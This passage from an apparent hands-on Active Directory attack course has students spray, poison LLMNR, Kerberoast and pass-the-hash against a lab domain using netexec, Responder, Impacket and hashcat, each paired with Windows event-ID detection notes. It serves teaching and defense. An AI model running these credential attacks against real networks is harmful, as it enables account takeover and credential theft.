+hydra -L users.txt -p 'Autumn2025!' 192.168.56.10 smb      # a spray, hydra-style
+hydra -l admin -P pass; medusa -h host -u user -P list -M ssh   # medusa = the same idea</code></pre></td></tr>
+          <tr><td><strong>Read the output</strong></td><td><span class="mono">[22][ssh] host: ... login: msfadmin password: msfadmin</span> = a hit. Watch for the service going quiet — that's the lockout, and you caused it.</td></tr>
+          <tr><td><strong>What it feeds</strong></td><td>Confirmed live credentials for the access plan (and the "how: online" note).</td></tr>
+          <tr><td><strong>SOC flip</strong></td><td><span style="color:#4ade80">Very loud.</span> Every attempt is a failed-logon event (Windows <span class="mono">4625</span>). A burst from one source is the clearest attack signal there is — which is exactly why brute-force barely works against a monitored, lockout-protected domain, and why spraying exists.</td></tr>
+        </tbody>
+      </table>
+      </div>
+
+      <h2 class="mono" style="color:#ff7043">netexec (nxc) — spraying &amp; pass-the-hash at scale</h2>
+      <p>The maintained successor to CrackMapExec. It authenticates one credential against many hosts (or many accounts
+         on one host) over SMB/WinRM/LDAP/MSSQL — the natural spray and pass-the-hash tool.</p>
+      <pre><code>nxc smb 192.168.56.10 -u users.txt -p 'Autumn2025!' --continue-on-success   # SPRAY: 1 pw, many users
+nxc smb 192.168.56.10 -u m.said -H &lt;NT-hash&gt;                                  # PASS-THE-HASH (no plaintext)
+nxc smb 192.168.56.0/24 -u a.fahmy -p 'Autumn2025!'                          # where does this cred work?</code></pre>
+
+      <figure class="dgm">
+        <svg viewBox="0 0 940 190" role="img" aria-label="Brute-force tries many passwords against one account and trips the lockout; spraying tries one password against many accounts, one attempt each, staying under the lockout threshold.">
+          <!-- brute -->
+          <text class="d-title" x="235" y="24" text-anchor="middle" font-size="12.5">Brute-force → locks out</text>
+          <rect x="40" y="40" width="150" height="46" rx="8" fill="#1f2533" stroke="#768290"/><text class="d-sub" x="115" y="60" text-anchor="middle">many passwords</text><text class="d-sub" x="115" y="76" text-anchor="middle">pw1 pw2 pw3 …</text>
+          <rect x="290" y="40" width="140" height="46" rx="8" fill="#1a1f2a" stroke="#e63946"/><text class="d-lbl" x="360" y="60" text-anchor="middle" font-size="12">ONE account</text><text class="d-sub" x="360" y="76" text-anchor="middle" fill="#e63946">locked after 5</text>
+          <path d="M190,63 L288,63" stroke="#e63946" stroke-width="1.8" marker-end="url(#ar-r)"/>
+          <text class="d-sub" x="235" y="112" text-anchor="middle" fill="#e63946">5 tries and the account locks — loud (4740), and you're stuck</text>
+          <!-- spray -->
+          <text class="d-title" x="705" y="24" text-anchor="middle" font-size="12.5" fill="#4ade80">Spray → stays under</text>
+          <rect x="510" y="40" width="150" height="46" rx="8" fill="#1f2533" stroke="#768290"/><text class="d-sub" x="585" y="60" text-anchor="middle">ONE password</text><text class="d-sub" x="585" y="76" text-anchor="middle">Autumn2025!</text>
+          <rect x="760" y="40" width="150" height="46" rx="8" fill="#1a1f2a" stroke="#4ade80"/><text class="d-lbl" x="835" y="60" text-anchor="middle" font-size="12">many accounts</text><text class="d-sub" x="835" y="76" text-anchor="middle" fill="#4ade80">1 try each</text>
+          <path d="M660,63 L758,63" stroke="#4ade80" stroke-width="1.8" marker-end="url(#ar-grn)"/>
+          <text class="d-sub" x="705" y="112" text-anchor="middle" fill="#4ade80">one attempt per account never reaches the threshold — it only takes one reuse</text>
+        </svg>
+        <figcaption><b>Invert the loop.</b> Brute-force is many-passwords-one-account (locks fast); spraying is
+           one-password-many-accounts (slips under lockout). Same tool, opposite blast radius.</figcaption>
+      </figure>
+
+      <div class="box attacker-view">
+        <span class="box-t">Why spraying beats brute-force</span>
+        <p>Brute-force = many passwords against <em>one</em> account → trips lockout after 5 tries. Spraying = <em>one</em>
+           password against many accounts → one attempt each, never near the threshold. Add a wait between rounds and you
+           can spray a whole domain under the radar of a naive lockout policy. It only takes <strong>one</strong> user
+           with <span class="mono">Autumn2025!</span> — and in any org of size, there always is one.</p>
+      </div>
+    </div>
+  </section>
+
+  <!-- ==========  P18 · LAB 4 — SPRAY THE DC  ========== -->
+  <section class="page" data-title="Lab 4: spray the domain">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S04 · P18</span><span class="tag lab">Hands-on · everyone · generates evidence</span><span class="time">⏱ 14 min</span></div>
+      <h1>Lab 4 — Spray the Domain, Watch the 4625s</h1>
+      <p class="lede">One password against every user in the directory — and the auth log fills with the exact signature
+         you'll turn into a detection rule.</p>
+    </div>
+    <div class="content">
+
+      <div class="box intro">
+        <span class="box-t">Why this lab matters twice</span>
+        <p>It gets you a credential <em>and</em> it generates real evidence. The spray produces a burst of Windows
+           <span class="mono">4625</span> failed-logon events on the DC — the evidence you'll read as a defender and
+           write a rule for in Lab 7. Attack now; keep the log.</p>
+      </div>
+
+      <div class="box warn">
+        <span class="box-t">Save the DC Security log after this lab</span>
+        <p>On the DC: Event Viewer → Windows Logs → Security, or <span class="mono">wevtutil epl Security lab4_spray.evtx</span>.
+           If your VM dies, the <span class="mono">saved/lab4_4625.evtx</span> fallback lets you still do Lab 7.</p>
+      </div>
+
+      <h2>Step 1 — build the user list</h2>
+      <ol class="steps">
+        <li>
+          <strong>Use the users you already enumerated</strong> (LDAP in Session 3, or the profile).
+          <pre><code>cat > users.txt &lt;&lt;'EOF'
+a.fahmy
+m.said
+n.gamal
+h.rashad
+svc_backup
+EOF</code></pre>
+          <div class="verify"><h4>✓ Verification</h4><ul><li>Your list is the real seeded directory users — not guesses</li></ul></div>
+        </li>
+      </ol>
+
+      <h2>Step 2 — spray one password across all of them</h2>
+      <ol class="steps">
+        <li>
+          <strong>One password, one attempt each</strong> — stays under lockout.
+          <pre><code>nxc smb 192.168.56.10 -u users.txt -p 'Autumn2025!' --continue-on-success
+# [+] ceh.lab\a.fahmy:Autumn2025!   (Pwn3d! or [+])
+# [+] ceh.lab\n.gamal:Autumn2025!
+# [+] ceh.lab\h.rashad:Autumn2025!
+# [-] ceh.lab\m.said           (distinct strong password — the spray misses it)
+# [-] ceh.lab\svc_backup       (its own password)</code></pre>
+          <figure class="shot">
+            <img src="assets/img/event-4625-spray.jpg" alt="Windows Event Viewer showing a burst of 4625 failed-logon events from one source in a short window — the password-spray signature">
+            <figcaption>The defender's view of your spray: a cluster of <span class="mono">4625</span> failed logons across
+               many accounts from one source, seconds apart. <em>(Ships as a labelled placeholder until captured on a monitored Windows DC.)</em></figcaption>
+          </figure>
+          <div class="verify">
+            <h4>✓ Verification</h4>
+            <ul>
+              <li>The spray hits <strong>3 of 5</strong> (a.fahmy, n.gamal, h.rashad) and <strong>misses m.said</strong> — a realistic partial success</li>
+              <li>You recorded the working credential(s) for the access plan</li>
+              <li>The DC Security log shows a burst of <span class="mono">4625</span> (and <span class="mono">4768/4771</span> pre-auth failures) from your IP — <strong>saved for Lab 7</strong></li>
+            </ul>
+          </div>
+        </li>
+      </ol>
+
+      <h2>Step 3 — the deliberate failure: trip the lockout</h2>
+      <div class="box warn">
+        <span class="box-t">Now do it the wrong way, on purpose</span>
+        <p>Point a <em>brute-force</em> at one account: <span class="mono">nxc smb 192.168.56.10 -u m.said -p rockyou.txt</span>.
+           After 5 attempts the account <strong>locks</strong> (the policy you seeded), every further try fails regardless
+           of the password, and you've created a very loud <span class="mono">4740</span> account-lockout event. <b>The
+           lesson:</b> brute-force against a modern domain locks accounts and screams; spraying exists precisely to avoid
+           this. Windows 11/Server now ship account lockout on by default — the era of quiet brute-force is over.</p>
+      </div>
+
+      <div class="box key-takeaway">
+        <span class="box-t">What you produced</span>
+        <p>A working domain credential from a single reused password — and the <span class="mono">4625</span> evidence
+           that a SOC would use to catch you. Both go forward: the credential to the access plan, the log to Lab 7.</p>
+      </div>
+    </div>
+  </section>
+  <!-- ==========  P19 · LLMNR POISONING + RESPONDER  ========== -->
+  <section class="page" data-title="LLMNR/NBT-NS poisoning">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S04 · P19</span><span class="tag theory">Method · the one diagram</span><span class="time">⏱ 8 min</span></div>
+      <h1>Poisoning a Broadcast the Whole Network Trusts</h1>
+      <p class="lede">When name resolution falls back to a broadcast, whoever answers first wins — and Responder always
+         answers first.</p>
+    </div>
+    <div class="content">
+
+      <div class="box intro">
+        <span class="box-t">Why this attack needs no password</span>
+        <p>Spraying and cracking need a starting credential or hash. LLMNR poisoning needs <em>nothing</em> — you sit on
+           the network and wait for a workstation to ask a question out loud. It's the classic "assumed breach" first
+           move on any internal engagement, and it targets the domain member (<span class="mono">WIN10-TGT01</span>) you
+           joined in Session 3.</p>
+      </div>
+
+      <h2>How it works — one picture</h2>
+      <figure class="dgm">
+        <svg viewBox="0 0 940 330" role="img" aria-label="A victim's DNS lookup fails, it falls back to an LLMNR broadcast asking who owns a name, the attacker running Responder answers first claiming to be that host, the victim authenticates to the attacker and sends its NetNTLMv2 response, which the attacker captures and cracks offline.">
+          <!-- actors -->
+          <rect x="30" y="40" width="150" height="52" rx="8" fill="#1f2533" stroke="#22d3ee"/>
+          <text class="d-title" x="105" y="64" text-anchor="middle" font-size="12.5">Victim (Win10)</text>
+          <text class="d-sub" x="105" y="82" text-anchor="middle">mistypes <tspan class="d-mono">\\fileshart</tspan></text>
+          <rect x="395" y="40" width="150" height="52" rx="8" fill="#1f2533" stroke="#4ade80"/>
+          <text class="d-title" x="470" y="64" text-anchor="middle" font-size="12.5">DNS (the DC)</text>
+          <text class="d-sub" x="470" y="82" text-anchor="middle">has no such name</text>
+          <rect x="760" y="40" width="150" height="52" rx="8" fill="#1a1f2a" stroke="#ff7043"/>
+          <text class="d-title" x="835" y="64" text-anchor="middle" font-size="12" fill="#ff7043">Attacker (Responder)</text>
+          <text class="d-sub" x="835" y="82" text-anchor="middle">listening on the LAN</text>
+          <!-- step 1 -->
+          <path d="M182,64 L393,64" fill="none" stroke="#768290" stroke-width="1.6" marker-end="url(#ar-g)"/>
+          <text class="d-sub" x="288" y="56" text-anchor="middle">1 · DNS lookup</text>
+          <path d="M393,86 L184,86" fill="none" stroke="#e63946" stroke-width="1.6" marker-end="url(#ar-r)"/>
+          <text class="d-sub" x="288" y="104" text-anchor="middle" fill="#e63946">NXDOMAIN — not found</text>
+          <!-- step 2 broadcast -->
+          <rect x="250" y="140" width="440" height="40" rx="8" fill="#1a1f2a" stroke="#fbbf24"/>
+          <text class="d-mono" x="470" y="165" text-anchor="middle" font-size="12" fill="#fbbf24">2 · LLMNR broadcast to the WHOLE segment: “who is fileshart?”</text>
+          <path d="M105,92 C105,150 200,160 248,160" fill="none" stroke="#fbbf24" stroke-width="1.6" marker-end="url(#ar-am)"/>
+          <!-- step 3 attacker answers -->
+          <path d="M690,160 C740,158 800,130 835,94" fill="none" stroke="#ff7043" stroke-width="1.8" marker-end="url(#ar-o)"/>
+          <text class="d-sub" x="700" y="140" fill="#ff7043">3 · “that's me!”</text>
+          <!-- step 4 auth -->
+          <path d="M180,72 C420,250 640,250 835,96" fill="none" stroke="#ff7043" stroke-width="2" stroke-dasharray="1 0" marker-end="url(#ar-o)"/>
+          <rect x="300" y="238" width="360" height="30" rx="6" fill="#0d1218" stroke="#ff7043"/>
+          <text class="d-mono" x="480" y="258" text-anchor="middle" font-size="11" fill="#ff7043">4 · victim authenticates → sends NetNTLMv2 response</text>
+          <!-- step 5 capture -->
+          <rect x="700" y="288" width="224" height="30" rx="6" fill="#1a1f2a" stroke="#e63946"/>
+          <text class="d-mono" x="812" y="308" text-anchor="middle" font-size="11" fill="#e63946">5 · captured → crack offline (-m 5600)</text>
+          <path d="M835,94 L835,286" fill="none" stroke="#e63946" stroke-width="1.4" marker-end="url(#ar-r)"/>
+        </svg>
+        <figcaption><b>Whoever answers first wins.</b> LLMNR/NBT-NS have no authentication — the victim believes the first
+           reply. Responder's whole job is to be that reply, harvesting NetNTLMv2 responses from every workstation that
+           mistypes a share or looks up a name that doesn't resolve.</figcaption>
+      </figure>
+
+      <h2 class="mono" style="color:#ff7043">Responder — the 7-part frame</h2>
+      <div class="tbl-scroll">
+      <table>
+        <tbody>
+          <tr><td style="width:150px"><strong>What it is</strong></td><td>A Kali tool that answers LLMNR, NBT-NS and mDNS queries, impersonating the requested host to harvest authentication.</td></tr>
+          <tr><td><strong>Why it exists</strong></td><td>Because Windows still falls back to trust-nobody broadcast name resolution, and a captured NetNTLMv2 is a crackable (or relayable) credential.</td></tr>
+          <tr><td><strong>The method</strong></td><td>Pick the interface, turn on the poisoners, and <em>wait</em> — the attack is patient, not active. A login, a mapped drive, a typo'd share name each trigger a capture.</td></tr>
+          <tr><td><strong>Real syntax</strong></td><td><pre><code>sudo responder -I eth0 -wv          # listen + poison on the host-only NIC
+# captures land in /usr/share/responder/logs/ and print live</code></pre></td></tr>
+          <tr><td><strong>Read the output</strong></td><td><span class="mono">[SMB] NTLMv2-SSP Hash : ceh.lab\j.doe:::&lt;hash&gt;</span> — a NetNTLMv2 response, ready for hashcat <span class="mono">-m 5600</span>.</td></tr>
+          <tr><td><strong>What it feeds</strong></td><td>A crackable credential for the access plan — or an SMB <em>relay</em> (next step in a real engagement).</td></tr>
+          <tr><td><strong>SOC flip</strong></td><td><span style="color:#4ade80">Detectable at the moment of poisoning.</span> A host answering LLMNR for names it doesn't own is anomalous; defenders plant a fake lookup (a "canary") and alarm if anything answers. And the fix is structural — see below.</td></tr>
+        </tbody>
+      </table>
+      </div>
+
+      <div class="box defender-view">
+        <span class="box-t">Countermeasure — and the currency check</span>
+        <p><strong>Disable LLMNR and NBT-NS</strong> (GPO: "Turn off multicast name resolution" → <span class="mono">EnableMulticast=0</span>;
+           disable NetBIOS over TCP/IP), require SMB signing, and segment the network. <strong>Currency (2026):</strong>
+           LLMNR + NBT-NS are <em>still on by default</em> on Windows 10/11 — Microsoft is "ramping down" toward
+           <strong>mDNS</strong> but hasn't disabled them, so the attack is very much alive (fresh public
+           LLMNR→DC-compromise write-ups appear monthly). And note: <strong>Responder poisons mDNS too</strong>, so the
+           replacement is also a surface. Verify the victim is still poisonable — <span class="mono">lab_s4_dc_setup.ps1 -Stage CheckLLMNR</span>.</p>
+      </div>
+    </div>
+  </section>
+
+  <!-- ==========  P20 · LAB 5 — RESPONDER CAPTURE  ========== -->
+  <section class="page" data-title="Lab 5: poison &amp; capture">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S04 · P20</span><span class="tag lab">Hands-on · everyone · generates evidence</span><span class="time">⏱ 14 min</span></div>
+      <h1>Lab 5 — Poison a Broadcast, Capture a Credential</h1>
+      <p class="lede">Run Responder, trigger one lookup from the Windows 10 member, and crack what comes back.</p>
+    </div>
+    <div class="content">
+
+      <div class="box intro">
+        <span class="box-t">What you are about to do</span>
+        <p>Start Responder on Kali, then make the Win10 box do a name lookup that fails — the same thing a real user does
+           by mistyping a share. Responder answers, captures the NetNTLMv2, and you crack it offline. The capture is
+           evidence #2 for Lab 7.</p>
+      </div>
+
+      <div class="box warn">
+        <span class="box-t">Host-only, and mind the other services</span>
+        <p>Run Responder only on the host-only NIC. If a lab service already uses SMB/HTTP on Kali, Responder warns —
+           that's fine here. Save <span class="mono">/usr/share/responder/logs/</span>; the fallback is <span class="mono">saved/lab5_netntlmv2.txt</span>.</p>
+      </div>
+
+      <h2>Step 1 — start Responder</h2>
+      <ol class="steps">
+        <li>
+          <pre><code>sudo responder -I eth0 -wv
+# [+] Listening for events...  (LLMNR, NBT-NS, MDNS poisoners ON)</code></pre>
+          <div class="verify"><h4>✓ Verification</h4><ul><li>Responder reports the poisoners ON and is listening on your host-only interface</li></ul></div>
+        </li>
+      </ol>
+
+      <h2>Step 2 — trigger a lookup from Win10</h2>
+      <ol class="steps">
+        <li>
+          <strong>On the Win10 member</strong>, access a share name that doesn't resolve (a real user's typo).
+          <pre><code># in Win10 Explorer or a cmd prompt:
+\\fileshart\data        # deliberately misspelled — DNS fails → LLMNR broadcast → Responder answers</code></pre>
+          <figure class="shot">
+            <img src="assets/img/responder-capture.jpg" alt="Responder terminal showing a captured SMB NTLMv2-SSP hash for a ceh.lab user">
+            <figcaption>Responder catching the fallback: an <span class="mono">[SMB] NTLMv2-SSP Hash</span> for a
+               <span class="mono">ceh.lab</span> account. <em>(Ships as a labelled placeholder until captured on a monitored domain.)</em></figcaption>
+          </figure>
+          <div class="verify">
+            <h4>✓ Verification</h4>
+            <ul>
+              <li>Responder prints <span class="mono">[SMB] NTLMv2-SSP Hash : ceh.lab\&lt;user&gt;:::&lt;hash&gt;</span></li>
+              <li>You saved the hash line to <span class="mono">netntlm.txt</span> (evidence #2)</li>
+            </ul>
+          </div>
+        </li>
+      </ol>
+
+      <h2>Step 3 — crack it (mode 5600, not 1000)</h2>
+      <ol class="steps">
+        <li>
+          <pre><code>hashcat -m 5600 netntlm.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
+hashcat -m 5600 netntlm.txt --show</code></pre>
+          <div class="verify">
+            <h4>✓ Verification</h4>
+            <ul>
+              <li>You chose <strong>5600</strong> (NetNTLMv2), not 1000 (NT hash) — and it cracked</li>
+              <li>The recovered credential goes in the access plan with "how: LLMNR poisoning"</li>
+            </ul>
+          </div>
+        </li>
+      </ol>
+
+      <div class="box key-takeaway">
+        <span class="box-t">What you produced</span>
+        <p>A domain credential harvested from thin air — no starting password, just a workstation that trusted a
+           broadcast. And a captured-poisoning event for the SOC to detect. This is why "disable LLMNR" is on every
+           hardening checklist ever written.</p>
+      </div>
+    </div>
+  </section>
+  <!-- ==========  P21 · KERBEROAST + IMPACKET + PTH  ========== -->
+  <section class="page" data-title="Kerberoast, Impacket &amp; PtH">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S04 · P21</span><span class="tag theory">Tool group · the AD attacks</span><span class="time">⏱ 9 min</span></div>
+      <h1>Roasting Tickets, and the Hash You Never Crack</h1>
+      <p class="lede">Impacket turns the two Kerberos bleed points into commands — and pass-the-hash reminds you that
+         sometimes the hash <em>is</em> the credential.</p>
+    </div>
+    <div class="content">
+
+      <div class="box intro">
+        <span class="box-t">Why this is the payoff of the mechanism pages</span>
+        <p>You saw the two bleed points in the Kerberos flow. Now you weaponise them with one toolkit. The beauty of
+           Kerberoasting: <strong>any</strong> domain user can do it — one weak service account and the whole domain
+           tilts. And pass-the-hash shows that a strong password doesn't save a machine whose hash has leaked.</p>
+      </div>
+
+      <h2 class="mono" style="color:#ff7043">Impacket — the 7-part frame</h2>
+      <div class="tbl-scroll">
+      <table>
+        <tbody>
+          <tr><td style="width:150px"><strong>What it is</strong></td><td>A Python suite of AD/Windows-protocol tools. In Kali the commands are prefixed <span class="mono">impacket-</span>. Maintained by <strong>Fortra</strong> (formerly SecureAuth).</td></tr>
+          <tr><td><strong>Why it exists</strong></td><td>To speak Kerberos, SMB and MSRPC as a raw client — so you can request tickets, dump secrets, and run commands without a Windows box.</td></tr>
+          <tr><td><strong>The method</strong></td><td>With one valid domain credential you can enumerate SPNs and roast them, ask for AS-REPs of pre-auth-disabled users, dump the NTDS, and exec commands. One foothold → the toolkit does the rest.</td></tr>
+          <tr><td><strong>Real syntax</strong></td><td><pre><code>impacket-GetUserSPNs  -dc-ip 192.168.56.10 ceh.lab/a.fahmy -request   # Kerberoast
+impacket-GetNPUsers   -dc-ip 192.168.56.10 ceh.lab/ -usersfile users.txt -no-pass   # AS-REP roast
+impacket-secretsdump  ceh.lab/Administrator@192.168.56.10             # dump SAM/LSA/NTDS
+impacket-psexec       ceh.lab/m.said@192.168.56.20                    # SYSTEM shell via SMB</code></pre></td></tr>
+          <tr><td><strong>Read the output</strong></td><td><span class="mono">$krb5tgs$23$*svc_backup*...</span> = a Kerberoast hash (mode 13100). <span class="mono">$krb5asrep$23$...</span> = an AS-REP (mode 18200). secretsdump prints <span class="mono">user:rid:LM:NT:::</span> for every account.</td></tr>
+          <tr><td><strong>What it feeds</strong></td><td>Crackable tickets and dumped hashes → the access plan → Session 5's lateral movement.</td></tr>
+          <tr><td><strong>SOC flip</strong></td><td><span style="color:#4ade80">Loud at the DC.</span> GetUserSPNs generates <span class="mono">4769</span> (service-ticket request) for each SPN — a burst from one user, encryption type <span class="mono">0x17</span> (RC4), is <em>the</em> Kerberoast signature. GetNPUsers generates <span class="mono">4768</span>. secretsdump/DCSync shows as <span class="mono">4662</span>. All high-signal to an identity-protection product.</td></tr>
+        </tbody>
+      </table>
+      </div>
+
+      <h2>Pass-the-hash — the hash <em>is</em> the credential</h2>
+      <p>You don't always need the plaintext. Because NTLM authenticates <em>with the hash</em>, a stolen NT hash logs you
+         in directly — no cracking step.</p>
+      <figure class="dgm">
+        <svg viewBox="0 0 940 190" role="img" aria-label="Two paths from a stolen NT hash: the crack path recovers a plaintext password then logs in, while pass-the-hash feeds the hash straight to netexec or psexec and authenticates without ever cracking.">
+          <rect x="16" y="72" width="150" height="48" rx="8" fill="#1f2533" stroke="#ff7043"/><text class="d-title" x="91" y="93" text-anchor="middle" font-size="12">Stolen NT hash</text><text class="d-sub" x="91" y="110" text-anchor="middle">SAM / NTDS / dump</text>
+          <!-- crack path -->
+          <rect x="330" y="20" width="230" height="48" rx="8" fill="#1a1f2a" stroke="#768290"/><text class="d-lbl" x="445" y="41" text-anchor="middle" font-size="11.5">crack it (hours, may fail)</text><text class="d-sub" x="445" y="58" text-anchor="middle">→ plaintext → normal login</text>
+          <!-- pth path -->
+          <rect x="330" y="118" width="230" height="52" rx="8" fill="#1a1f2a" stroke="#a78bfa"/><text class="d-title" x="445" y="139" text-anchor="middle" font-size="12" fill="#a78bfa">pass-the-hash</text><text class="d-sub" x="445" y="157" text-anchor="middle">feed the hash straight to auth</text>
+          <rect x="700" y="70" width="224" height="52" rx="8" fill="#1f2533" stroke="#4ade80"/><text class="d-title" x="812" y="91" text-anchor="middle" font-size="12" fill="#4ade80">Authenticated</text><text class="d-sub" x="812" y="109" text-anchor="middle" class="d-mono">nxc smb host -u u -H &lt;hash&gt;</text>
+          <path d="M166,88 C240,70 260,48 328,44" fill="none" stroke="#768290" stroke-width="1.4" marker-end="url(#ar-g)"/>
+          <path d="M166,104 C240,120 260,140 328,144" fill="none" stroke="#a78bfa" stroke-width="1.6" marker-end="url(#ar-pu)"/>
+          <path d="M560,44 C640,52 660,74 698,88" fill="none" stroke="#768290" stroke-width="1.4" marker-end="url(#ar-g)"/>
+          <path d="M560,144 C640,136 660,116 698,104" fill="none" stroke="#a78bfa" stroke-width="1.6" marker-end="url(#ar-pu)"/>
+        </svg>
+        <figcaption><b>Cracking is optional.</b> The lower path (T1550.002) skips it entirely — which is why a 30-character
+           service-account password is no comfort once its NT hash leaks from the NTDS.</figcaption>
+      </figure>
+
+      <div class="box note">
+        <span class="box-t">Introduced today, taught fully later</span>
+        <p><span class="mono">evil-winrm</span> (an interactive PowerShell shell once you have a credential or hash) is
+           used in Lab 6. <span class="mono">mimikatz</span> (dumping LSASS for live hashes and tickets) and
+           <span class="mono">msfconsole</span> are <em>introduced</em> only — Mimikatz gets full treatment in Session 6,
+           Metasploit in Session 5. Don't rabbit-hole; note them and move on.</p>
+      </div>
+    </div>
+  </section>
+
+  <!-- ==========  P22 · LAB 6 — KERBEROAST  ========== -->
+  <section class="page" data-title="Lab 6: roast the service account">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S04 · P22</span><span class="tag lab">Hands-on · everyone · generates evidence</span><span class="time">⏱ 15 min</span></div>
+      <h1>Lab 6 — Kerberoast, and the Ticket That Won't Crack</h1>
+      <p class="lede">Request a service ticket with a low-priv account, crack the service account's password offline, and
+         generate the 4769 evidence — then meet the honest failure case.</p>
+    </div>
+    <div class="content">
+
+      <div class="box intro">
+        <span class="box-t">What you are about to do</span>
+        <p>Using any domain credential you already own (from Lab 4/5), request the service tickets for the domain's SPNs,
+           crack the weak one offline, and try the strong one — which will <em>never</em> crack. Then pass-the-hash to a
+           box you couldn't crack into. This generates evidence #3 (the <span class="mono">4769</span> burst) for Lab 7.</p>
+      </div>
+
+      <div class="box warn">
+        <span class="box-t">Save the DC Security log again</span>
+        <p><span class="mono">wevtutil epl Security lab6_kerberoast.evtx</span> on the DC (or filter to
+           <span class="mono">4769</span>). Fallback: <span class="mono">saved/lab6_4769.evtx</span> and
+           <span class="mono">saved/lab6_krb5tgs.txt</span>.</p>
+      </div>
+
+      <h2>Step 1 — roast every SPN</h2>
+      <ol class="steps">
+        <li>
+          <strong>Request the service tickets</strong> with a low-priv domain credential.
+          <pre><code>impacket-GetUserSPNs -dc-ip 192.168.56.10 ceh.lab/a.fahmy -request
+# ServicePrincipalName            Name        ...
+# MSSQLSvc/win10-tgt01.ceh.lab:1433  svc_backup   → $krb5tgs$23$*svc_backup*...
+# MSSQLSvc/win10-tgt01.ceh.lab:1434  svc_sql      → $krb5tgs$23$*svc_sql*...
+# save both hashes to spn.txt</code></pre>
+          <figure class="shot">
+            <img src="assets/img/getuserspns.jpg" alt="impacket-GetUserSPNs output listing service principal names and their krb5tgs Kerberoast hashes for svc_backup and svc_sql">
+            <figcaption><span class="mono">GetUserSPNs -request</span> returning the roastable tickets. <em>(Ships as a labelled placeholder until captured on a monitored domain.)</em></figcaption>
+          </figure>
+          <div class="verify">
+            <h4>✓ Verification</h4>
+            <ul>
+              <li>You got a <span class="mono">$krb5tgs$23$</span> ticket for <strong>each</strong> SPN account</li>
+              <li>The DC logged a burst of <span class="mono">4769</span> with encryption type <span class="mono">0x17</span> — <strong>saved for Lab 7</strong></li>
+            </ul>
+          </div>
+        </li>
+      </ol>
+
+      <h2>Step 2 — crack the weak one (mode 13100)</h2>
+      <ol class="steps">
+        <li>
+          <pre><code>hashcat -m 13100 spn.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
+hashcat -m 13100 spn.txt --show    # → svc_backup:&lt;its weak password&gt;</code></pre>
+          <div class="verify">
+            <h4>✓ Verification</h4>
+            <ul>
+              <li><span class="mono">svc_backup</span> cracks — its password was weak, as service accounts often are</li>
+              <li>You recorded it as "credential obtained · how: Kerberoast" in the access plan</li>
+            </ul>
+          </div>
+        </li>
+      </ol>
+
+      <h2>Step 3 — the honest failure case</h2>
+      <div class="box warn">
+        <span class="box-t">The ticket that never cracks</span>
+        <p><span class="mono">svc_sql</span> was seeded with a long random password. Its ticket roasts exactly the same
+           way, but hashcat runs to <span class="mono">Exhausted</span> against rockyou and every rule — because the
+           password isn't in any wordlist. <b>The lesson:</b> Kerberoasting recovers <em>weak</em> service passwords, not
+           all of them. A long random service-account password (or a gMSA) is the countermeasure — record svc_sql as
+           "roastable, not cracked (strong password)."</p>
+      </div>
+
+      <h2>Step 4 — you don't always need to crack (pass-the-hash + a shell)</h2>
+      <ol class="steps">
+        <li>
+          <strong>Use a dumped hash directly</strong>, and get an interactive shell with a working credential.
+          <pre><code>impacket-secretsdump ceh.lab/svc_backup@192.168.56.10    # now that svc_backup is cracked
+nxc smb 192.168.56.20 -u Administrator -H &lt;NT-hash&gt;       # pass-the-hash, no plaintext
+evil-winrm -i 192.168.56.20 -u svc_backup -p '&lt;cracked&gt;'  # interactive PowerShell shell</code></pre>
+          <div class="verify">
+            <h4>✓ Verification</h4>
+            <ul>
+              <li>You authenticated somewhere with a <strong>hash</strong> (no cracking) — pass-the-hash proven</li>
+              <li>You have an interactive session with at least one recovered credential</li>
+            </ul>
+          </div>
+        </li>
+      </ol>
+
+      <div class="box key-takeaway">
+        <span class="box-t">What you produced</span>
+        <p>A cracked service-account password from a ticket any user could request, a demonstrated pass-the-hash, the
+           honest limit (a strong service password defeats the roast), and the <span class="mono">4769</span> evidence
+           for Lab 7. Your access plan is nearly complete.</p>
+      </div>
+    </div>
+  </section>
+  <!-- ==========  P23 · THE AUTH-LOG SOC FLIP  ========== -->
+  <section class="page" data-title="The auth-log SOC flip">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S04 · P23</span><span class="tag defensive">Defender · the consolidated flip</span><span class="time">⏱ 6 min</span></div>
+      <h1>Every Attack Today, and the Log Line It Left</h1>
+      <p class="lede">You've been the attacker all afternoon. Here is the other side of every keystroke — the events a
+         SOC analyst actually triages.</p>
+    </div>
+    <div class="content">
+
+      <div class="box intro">
+        <span class="box-t">Why this page exists</span>
+        <p>Authentication is the most-monitored surface in any network because it's what everything else protects. Each
+           attack you ran writes a specific, high-signal event. Learn the pairs and you can sit on either side of the
+           wire — which is exactly what you're about to prove in Lab 7.</p>
+      </div>
+
+      <figure class="dgm">
+        <svg viewBox="0 0 940 300" role="img" aria-label="Attacker action on the left in orange paired with the defender's log evidence on the right in green, for password spraying, Kerberoasting, and LLMNR poisoning.">
+          <text x="235" y="26" text-anchor="middle" font-size="13" class="d-title" fill="#ff7043">ATTACKER did</text>
+          <text x="705" y="26" text-anchor="middle" font-size="13" class="d-title" fill="#4ade80">SOC sees</text>
+          <line x1="470" y1="40" x2="470" y2="286" stroke="#333b4c" stroke-width="1.2" stroke-dasharray="3 4"/>
+          <!-- row 1 spray -->
+          <rect x="20" y="48" width="430" height="66" rx="8" fill="#1a1f2a" stroke="#ff7043"/>
+          <text class="d-lbl" x="38" y="72" font-size="12">Password spray (Lab 4)</text>
+          <text class="d-sub" x="38" y="92">1 password → many accounts, one source</text>
+          <text class="d-sub" x="38" y="107" class="d-mono">nxc smb DC -u users.txt -p '...'</text>
+          <rect x="490" y="48" width="430" height="66" rx="8" fill="#1a1f2a" stroke="#4ade80"/>
+          <text class="d-lbl" x="508" y="72" font-size="12" fill="#4ade80" class="d-mono">4625</text>
+          <text class="d-sub" x="560" y="72">failed logons, many users, short window</text>
+          <text class="d-sub" x="508" y="92">+ <tspan class="d-mono">4771/4768</tspan> pre-auth failures (status 0x18)</text>
+          <text class="d-sub" x="508" y="107">the one-to-many signature → your rule</text>
+          <path d="M450,81 L488,81" stroke="#768290" stroke-width="1.5" marker-end="url(#ar-g)"/>
